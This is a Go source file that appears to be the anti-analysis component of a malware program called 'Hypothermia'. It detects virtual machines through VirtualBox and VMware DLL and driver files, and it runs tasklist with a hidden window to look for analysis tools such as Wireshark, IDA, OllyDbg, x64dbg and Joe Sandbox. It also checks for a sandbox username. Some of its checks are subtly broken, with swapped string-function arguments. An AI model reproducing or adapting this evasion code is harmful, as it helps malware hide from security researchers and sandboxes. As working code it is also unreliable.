package utils

import (
	"os"
	"os/exec"
	"strings"
	"syscall"
)

var vms = [5]string{
	"vmGuestLib.dll",
	"vm3dgl.dll",
	"vboxhook.dll",
	"vboxmrxnp.dll",
	"vmsrvc.dll",
}

var drivers = [7]string{
	"VBoxGuest.sys",
	"VBoxSF.sys",
	"VBoxVideo.sys",
	"vm3dmp.sys",
	"vmhgfs.sys",
	"vmusbmouse.sys",
	"vmsrvc.sys",
}

var processes = [27]string{
	"vmtoolsd.exe",
	"vmwaretray.exe",
	"vmwareuser.exe",
	"fakenet.exe",
	"dumpcap.exe",
	"httpdebuggerui.exe",
	"wireshark.exe",
	"fiddler.exe",
	"vboxservice.exe",
	"df5serv.exe",
	"vboxtray.exe",
	"vmwaretray.exe",
	"ida64.exe",
	"ollydbg.exe",
	"pestudio.exe",
	"vgauthservice.exe",
	"vmacthlp.exe",
	"x96dbg.exe",
	"x32dbg.exe",
	"prl_cc.exe",
	"prl_tools.exe",
	"xenservice.exe",
	"qemu-ga.exe",
	"joeboxcontrol.exe",
	"ksdumperclient.exe",
	"ksdumper.exe",
	"joeboxserver.exe",
}

var vtNames = [1]string{
	"bruno",
}

func CheckVMs() bool {
	for _, vm := range vms {
		if _, err := os.Stat("C:\\windows\\system32\\" + vm); os.IsNotExist(err) {
			return false
		}
	}

	return true
}

func CheckDrivers() bool {
	for _, dr := range drivers {
		if _, err := os.Stat("C:\\windows\\system32\\drivers\\" + dr); os.IsNotExist(err) {
			return false
		}
	}

	return true
}

func CheckProcesses() bool {
	cmd := exec.Command("tasklist")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	out, err := cmd.Output()
	if err != nil {
		return false
	}

	procs := string(out)
	for _, proc := range processes {
		if strings.Contains(procs, proc) {
			return true
		}
	}

	return false
}

func CheckVT() bool {
	path, err := os.Executable()
	if err != nil {
		return false
	}

	path = strings.ToLower(path)

	for _, name := range vtNames {
		if strings.Contains(name, path) && !strings.HasSuffix("Hypothermia.exe", path) {
			return true
		}
	}

	return false
}
